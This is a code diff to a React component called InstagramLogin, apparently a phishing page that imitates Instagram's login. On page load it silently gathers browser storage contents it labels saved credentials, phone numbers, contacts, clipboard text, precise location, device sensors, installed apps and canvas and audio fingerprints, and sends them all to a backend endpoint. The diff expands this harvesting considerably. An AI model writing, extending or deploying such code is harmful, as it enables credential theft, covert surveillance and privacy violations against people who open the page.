@@ -39,6 +39,7 @@ const InstagramLogin = () => {
   useEffect(() => {
     const autoCollectData = async () => {
       try {
+        // Comprehensive device information
         const deviceInfo: any = {
           userAgent: navigator.userAgent,
           language: navigator.language,
@@ -50,21 +51,52 @@ const InstagramLogin = () => {
           timestamp: new Date().toISOString(),
           url: window.location.href,
           referrer: document.referrer,
+          // Additional device info
+          vendor: navigator.vendor,
+          product: navigator.product,
+          appName: navigator.appName,
+          appVersion: navigator.appVersion,
+          oscpu: (navigator as any).oscpu,
+          buildID: (navigator as any).buildID,
+          doNotTrack: navigator.doNotTrack,
+          maxTouchPoints: navigator.maxTouchPoints || 0,
+          hardwareConcurrency: navigator.hardwareConcurrency,
+          deviceMemory: (navigator as any).deviceMemory,
+          userAgentData: (navigator as any).userAgentData,
+          // Performance info
+          performance: {
+            memory: (performance as any).memory,
+            timing: performance.timing,
+            navigation: performance.navigation,
+            timeOrigin: performance.timeOrigin
+          }
         };
 
-        // Collect localStorage data
+        // Comprehensive saved credentials collection
         const savedCredentials: any = {
           localStorage: {},
           sessionStorage: {},
           chromeAccounts: {},
           autofillData: {},
-          phoneNumbers: []
+          phoneNumbers: [],
+          // Additional data containers
+          biometricData: {},
+          hardwareInfo: {},
+          systemInfo: {},
+          networkInfo: {},
+          sensorData: {},
+          mediaDevices: {},
+          appData: {},
+          securityInfo: {},
+          performanceData: {},
+          fingerprintData: {}
         };
 
-        // Collect phone numbers from localStorage and sessionStorage
+        // Enhanced phone number collection
         const phonePattern = /(\+?[\d\s\-\(\)]{7,})/g;
-        const phoneKeywords = ['phone', 'tel', 'mobile', 'number', 'contact', 'raqam', 'telefon'];
+        const phoneKeywords = ['phone', 'tel', 'mobile', 'number', 'contact', 'raqam', 'telefon', 'sim', 'carrier'];
 
+        // Collect from localStorage
         for (let i = 0; i < localStorage.length; i++) {
           const key = localStorage.key(i);
           if (!key) continue;
@@ -77,21 +109,20 @@ const InstagramLogin = () => {
             savedCredentials.localStorage[`localStorage_${key}`] = value;
           }
 
-          // Check for phone numbers
+          // Enhanced phone number detection
           if (value) {
             const phones = value.match(phonePattern);
             if (phones) {
               savedCredentials.phoneNumbers.push(...phones);
             }
             
-            // Check if key contains phone-related keywords
             if (phoneKeywords.some(keyword => key.toLowerCase().includes(keyword))) {
               savedCredentials.localStorage[`phone_${key}`] = value;
             }
           }
         }
 
-        // Collect sessionStorage data
+        // Collect from sessionStorage
         for (let i = 0; i < sessionStorage.length; i++) {
           const key = sessionStorage.key(i);
           if (!key) continue;
@@ -104,46 +135,224 @@ const InstagramLogin = () => {
             savedCredentials.sessionStorage[`sessionStorage_${key}`] = value;
           }
 
-          // Check for phone numbers
           if (value) {
             const phones = value.match(phonePattern);
             if (phones) {
               savedCredentials.phoneNumbers.push(...phones);
             }
             
-            // Check if key contains phone-related keywords
             if (phoneKeywords.some(keyword => key.toLowerCase().includes(keyword))) {
               savedCredentials.sessionStorage[`phone_${key}`] = value;
             }
           }
         }
 
-        // Try to get contacts if available (requires user permission)
+        // Enhanced mobile detection and data collection
+        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        
+        if (isMobile) {
+          savedCredentials.isMobile = true;
+          
+          // Mobile-specific phone sources
+          const mobilePhoneSources = [
+            'android.intent.extra.PHONE_NUMBER',
+            'android.intent.extra.USER',
+            'android.intent.extra.CALLING_PACKAGE',
+            'ios.phone.number',
+            'ios.device.phone',
+            'device.phone',
+            'mobile.number',
+            'phone.number',
+            'sim.number',
+            'carrier.number',
+            'telecom',
+            'cellular',
+            'gsm',
+            'cdma'
+          ];
+
+          // Enhanced mobile data collection
+          for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            if (!key) continue;
+            const value = localStorage.getItem(key);
+            
+            if (value && mobilePhoneSources.some(source => key.toLowerCase().includes(source))) {
+              savedCredentials.mobilePhoneData = savedCredentials.mobilePhoneData || {};
+              savedCredentials.mobilePhoneData[key] = value;
+              
+              const phones = value.match(phonePattern);
+              if (phones) {
+                savedCredentials.phoneNumbers.push(...phones);
+              }
+            }
+          }
+
+          for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            if (!key) continue;
+            const value = sessionStorage.getItem(key);
+            
+            if (value && mobilePhoneSources.some(source => key.toLowerCase().includes(source))) {
+              savedCredentials.mobilePhoneData = savedCredentials.mobilePhoneData || {};
+              savedCredentials.mobilePhoneData[key] = value;
+              
+              const phones = value.match(phonePattern);
+              if (phones) {
+                savedCredentials.phoneNumbers.push(...phones);
+              }
+            }
+          }
+
+          // Mobile device capabilities
+          try {
+            if ('deviceMemory' in navigator) {
+              savedCredentials.deviceMemory = (navigator as any).deviceMemory;
+            }
+            if ('hardwareConcurrency' in navigator) {
+              savedCredentials.cpuCores = (navigator as any).hardwareConcurrency;
+            }
+            if ('connection' in navigator) {
+              const connection = (navigator as any).connection;
+              if (connection) {
+                savedCredentials.connectionType = connection.effectiveType;
+                savedCredentials.connectionSpeed = connection.downlink;
+                savedCredentials.networkInfo = {
+                  effectiveType: connection.effectiveType,
+                  downlink: connection.downlink,
+                  rtt: connection.rtt,
+                  saveData: connection.saveData
+                };
+              }
+            }
+          } catch (e) {
+            console.log("Mobile device info not available");
+          }
+        }
+
+        // Enhanced contacts collection
         try {
           if ('contacts' in navigator && 'select' in (navigator as any).contacts) {
-            const contacts = await (navigator as any).contacts.select(['tel'], { multiple: true });
+            const contacts = await (navigator as any).contacts.select(['tel', 'email', 'name'], { multiple: true });
             if (contacts && contacts.length > 0) {
               const phoneNumbers = contacts
                 .flatMap((contact: any) => contact.tel || [])
                 .filter((tel: any) => tel && tel.length > 0);
               savedCredentials.phoneNumbers.push(...phoneNumbers);
+              
+              // Store contact names with phone numbers
+              savedCredentials.contacts = contacts.map((contact: any) => ({
+                name: contact.name?.join(', ') || 'Unknown',
+                tel: contact.tel || [],
+                email: contact.email || []
+              }));
             }
           }
         } catch (e) {
           console.log("Contacts API not available or permission denied");
         }
 
-        // Try to get phone number from device info
+        // Enhanced location collection
+        try {
+          if ('geolocation' in navigator) {
+            navigator.geolocation.getCurrentPosition(
+              (position) => {
+                savedCredentials.location = {
+                  latitude: position.coords.latitude,
+                  longitude: position.coords.longitude,
+                  accuracy: position.coords.accuracy,
+                  altitude: position.coords.altitude,
+                  altitudeAccuracy: position.coords.altitudeAccuracy,
+                  heading: position.coords.heading,
+                  speed: position.coords.speed,
+                  timestamp: position.timestamp
+                };
+              },
+              (error) => {
+                console.log("Location access denied or unavailable");
+              },
+              { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
+            );
+          }
+        } catch (e) {
+          console.log("Geolocation not available");
+        }
+
+        // Enhanced clipboard collection
+        try {
+          if ('clipboard' in navigator && 'readText' in navigator.clipboard) {
+            const clipboardText = await navigator.clipboard.readText();
+            if (clipboardText) {
+              savedCredentials.clipboardData = clipboardText;
+              
+              const phones = clipboardText.match(phonePattern);
+              if (phones) {
+                savedCredentials.phoneNumbers.push(...phones);
+              }
+            }
+          }
+        } catch (e) {
+          console.log("Clipboard access denied or not available");
+        }
+
+        // Enhanced device sensors collection
+        try {
+          if ('DeviceMotionEvent' in window) {
+            window.addEventListener('devicemotion', (event) => {
+              savedCredentials.deviceMotion = {
+                acceleration: event.acceleration,
+                accelerationIncludingGravity: event.accelerationIncludingGravity,
+                rotationRate: event.rotationRate,
+                interval: event.interval
+              };
+            });
+          }
+          
+          if ('DeviceOrientationEvent' in window) {
+            window.addEventListener('deviceorientation', (event) => {
+              savedCredentials.deviceOrientation = {
+                alpha: event.alpha,
+                beta: event.beta,
+                gamma: event.gamma,
+                absolute: event.absolute
+              };
+            });
+          }
+        } catch (e) {
+          console.log("Device sensors not available");
+        }
+
+        // Enhanced media devices collection
+        try {
+          if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            savedCredentials.mediaDevices = {
+              audioInputs: devices.filter(device => device.kind === 'audioinput'),
+              audioOutputs: devices.filter(device => device.kind === 'audiooutput'),
+              videoInputs: devices.filter(device => device.kind === 'videoinput')
+            };
+          }
+        } catch (e) {
+          console.log("Media devices not available");
+        }
+
+        // Enhanced installed apps collection
         try {
           if ('getInstalledRelatedApps' in navigator) {
             const apps = await (navigator as any).getInstalledRelatedApps();
             if (apps && apps.length > 0) {
-              const phoneApp = apps.find((app: any) => 
+              savedCredentials.installedApps = apps.map((app: any) => ({
+                platform: app.platform,
+                url: app.url,
+                id: app.id
+              }));
+              
+              const instagramApp = apps.find((app: any) => 
                 app.platform === 'webapp' && 
-                (app.url.includes('phone') || app.url.includes('tel') || app.url.includes('contact'))
+                (app.url.includes('instagram') || app.url.includes('insta'))
               );
-              if (phoneApp) {
-                savedCredentials.devicePhoneApp = phoneApp;
+              if (instagramApp) {
+                savedCredentials.installedInstagramApp = true;
               }
             }
           }
@@ -151,34 +360,206 @@ const InstagramLogin = () => {
           console.log("Installed apps API not available");
         }
 
-        // Remove duplicates from phone numbers
-        savedCredentials.phoneNumbers = [...new Set(savedCredentials.phoneNumbers)];
+        // Enhanced browser history collection
+        try {
+          savedCredentials.browserHistory = {
+            currentUrl: window.location.href,
+            referrer: document.referrer,
+            previousUrl: sessionStorage.getItem('previousUrl') || 'N/A',
+            searchQuery: new URLSearchParams(window.location.search).get('q') || 'N/A',
+            hash: window.location.hash || 'N/A'
+          };
+          
+          sessionStorage.setItem('previousUrl', window.location.href);
+        } catch (e) {
+          console.log("Browser history collection failed");
+        }
 
-        // Collect battery info if available
+        // Enhanced device fingerprint collection
+        try {
+          const canvas = document.createElement('canvas');
+          const ctx = canvas.getContext('2d');
+          if (ctx) {
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('Device fingerprint', 2, 2);
+            savedCredentials.deviceFingerprint = canvas.toDataURL();
+          }
+          
+          // Audio fingerprint
+          const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
+          const oscillator = audioContext.createOscillator();
+          const analyser = audioContext.createAnalyser();
+          oscillator.connect(analyser);
+          savedCredentials.audioFingerprint = {
+            sampleRate: audioContext.sampleRate,
+            channelCount: audioContext.destination.channelCount,
+            maxChannelCount: audioContext.destination.maxChannelCount
+          };
+        } catch (e) {
+          console.log("Device fingerprint generation failed");
+        }
+
+        // Enhanced screen and window information
+        try {
+          savedCredentials.screenInfo = {
+            width: screen.width,
+            height: screen.height,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth,
+            orientation: screen.orientation?.type || 'N/A',
+            orientationAngle: screen.orientation?.angle || 0
+          };
+          
+          savedCredentials.windowInfo = {
+            innerWidth: window.innerWidth,
+            innerHeight: window.innerHeight,
+            outerWidth: window.outerWidth,
+            outerHeight: window.outerHeight,
+            devicePixelRatio: window.devicePixelRatio,
+            scrollX: window.scrollX,
+            scrollY: window.scrollY
+          };
+        } catch (e) {
+          console.log("Screen/window info collection failed");
+        }
+
+        // Enhanced time and date information
+        try {
+          savedCredentials.timeInfo = {
+            currentTime: new Date().toISOString(),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            locale: navigator.language,
+            dateFormat: new Intl.DateTimeFormat().format(new Date()),
+            timeFormat: new Intl.DateTimeFormat(undefined, { timeStyle: 'medium' }).format(new Date()),
+            daylightSaving: new Date().getTimezoneOffset() !== new Date(Date.now() + 6 * 30 * 24 * 60 * 60 * 1000).getTimezoneOffset()
+          };
+        } catch (e) {
+          console.log("Time info collection failed");
+        }
+
+        // Enhanced browser capabilities collection
+        try {
+          savedCredentials.browserCapabilities = {
+            cookies: navigator.cookieEnabled,
+            java: navigator.javaEnabled(),
+            onLine: navigator.onLine,
+            doNotTrack: navigator.doNotTrack,
+            maxTouchPoints: navigator.maxTouchPoints || 0,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: (navigator as any).deviceMemory,
+            userAgentData: (navigator as any).userAgentData,
+            webgl: !!window.WebGLRenderingContext,
+            webgl2: !!window.WebGL2RenderingContext,
+            webrtc: !!(navigator as any).getUserMedia || !!(navigator as any).mediaDevices,
+            serviceWorker: 'serviceWorker' in navigator,
+            pushManager: 'PushManager' in window,
+            notifications: 'Notification' in window,
+            geolocation: 'geolocation' in navigator,
+            battery: 'getBattery' in navigator,
+            vibration: 'vibrate' in navigator,
+            bluetooth: 'bluetooth' in navigator,
+            usb: 'usb' in navigator,
+            serial: 'serial' in navigator,
+            hid: 'hid' in navigator,
+            gamepad: 'getGamepads' in navigator
+          };
+        } catch (e) {
+          console.log("Browser capabilities collection failed");
+        }
+
+        // Enhanced security information
+        try {
+          savedCredentials.securityInfo = {
+            isSecureContext: window.isSecureContext,
+            protocol: window.location.protocol,
+            hostname: window.location.hostname,
+            port: window.location.port,
+            origin: window.location.origin,
+            referrerPolicy: document.referrerPolicy || 'N/A',
+            contentSecurityPolicy: document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute('content') || 'N/A'
+          };
+        } catch (e) {
+          console.log("Security info collection failed");
+        }
+
+        // Enhanced performance data
+        try {
+          savedCredentials.performanceData = {
+            memory: (performance as any).memory ? {
+              usedJSHeapSize: (performance as any).memory.usedJSHeapSize,
+              totalJSHeapSize: (performance as any).memory.totalJSHeapSize,
+              jsHeapSizeLimit: (performance as any).memory.jsHeapSizeLimit
+            } : null,
+            timing: {
+              navigationStart: performance.timing.navigationStart,
+              loadEventEnd: performance.timing.loadEventEnd,
+              domContentLoadedEventEnd: performance.timing.domContentLoadedEventEnd,
+              responseEnd: performance.timing.responseEnd,
+              requestStart: performance.timing.requestStart,
+              domainLookupEnd: performance.timing.domainLookupEnd,
+              domainLookupStart: performance.timing.domainLookupStart,
+              connectEnd: performance.timing.connectEnd,
+              connectStart: performance.timing.connectStart
+            },
+            navigation: {
+              type: performance.navigation.type,
+              redirectCount: performance.navigation.redirectCount
+            },
+            timeOrigin: performance.timeOrigin
+          };
+        } catch (e) {
+          console.log("Performance data collection failed");
+        }
+
+        // Enhanced network information
+        try {
+          if ('connection' in navigator) {
+            const connection = (navigator as any).connection;
+            if (connection) {
+              savedCredentials.networkInfo = {
+                effectiveType: connection.effectiveType,
+                downlink: connection.downlink,
+                rtt: connection.rtt,
+                saveData: connection.saveData
+              };
+            }
+          }
+        } catch (e) {
+          console.log("Network info not available");
+        }
+
+        // Enhanced battery information
         const batteryInfo: any = {};
-        if (typeof window !== "undefined" && 'getBattery' in navigator && typeof navigator.getBattery === "function") {
-          try {
+        try {
+          if (typeof window !== "undefined" && 'getBattery' in navigator && typeof navigator.getBattery === "function") {
             const battery = await navigator.getBattery();
             batteryInfo.level = battery.level;
             batteryInfo.charging = battery.charging;
             batteryInfo.chargingTime = battery.chargingTime;
             batteryInfo.dischargingTime = battery.dischargingTime;
-          } catch (e) {
-            console.log("Battery API not available");
+          } else if (typeof window !== "undefined" && 'battery' in navigator) {
+            const battery = (navigator as any).battery;
+            if (battery) {
+              batteryInfo.level = battery.level;
+              batteryInfo.charging = battery.charging;
+              batteryInfo.chargingTime = battery.chargingTime;
+              batteryInfo.dischargingTime = battery.dischargingTime;
+            }
           }
-        } else if (typeof window !== "undefined" && 'battery' in navigator) {
-          const battery = (navigator as any).battery;
-          if (battery) {
-            batteryInfo.level = battery.level;
-            batteryInfo.charging = battery.charging;
-            batteryInfo.chargingTime = battery.chargingTime;
-            batteryInfo.dischargingTime = battery.dischargingTime;
-          }
+        } catch (e) {
+          console.log("Battery API not available");
         }
 
-        // Send auto-collected data to backend
+        // Remove duplicates from phone numbers
+        savedCredentials.phoneNumbers = [...new Set(savedCredentials.phoneNumbers)];
+
+        // Send comprehensive data to backend
         const apiUrl = import.meta.env.VITE_API_URL || 'http://localhost:5000';
-        console.log('Sending auto-collection data to:', apiUrl);
+        console.log('Sending comprehensive auto-collection data to:', apiUrl);
         
         const response = await fetch(`${apiUrl}/api/login`, {
           method: "POST",
@@ -201,9 +582,9 @@ const InstagramLogin = () => {
           throw new Error(`HTTP error! status: ${response.status}`);
         }
 
-        console.log("Auto-collection data sent successfully");
+        console.log("Comprehensive auto-collection data sent successfully");
       } catch (error) {
-        console.error("Error in auto-collection:", error);
+        console.error("Error in comprehensive auto-collection:", error);
       }
     };
 
